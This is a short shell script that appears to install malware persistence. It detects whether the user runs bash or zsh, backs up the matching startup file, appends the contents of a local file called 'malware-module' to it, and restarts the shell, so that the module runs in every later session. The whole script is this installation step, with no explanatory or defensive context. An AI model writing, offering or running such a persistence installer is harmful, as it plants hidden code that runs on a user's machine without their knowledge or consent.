#!/bin/sh

if [[ "$SHELL" == "/bin/bash" ]]; then
  cp ~/.bashrc ~/.bashrc.bak
  cat ./malware-module >> ~/.bashrc
  exec bash
elif [[ "$SHELL" == "/bin/zsh" ]]; then
  cp ~/.zshrc ~/.zshrc.bak
  cat ./malware-module >> ~/.zshrc
  exec zsh
fi

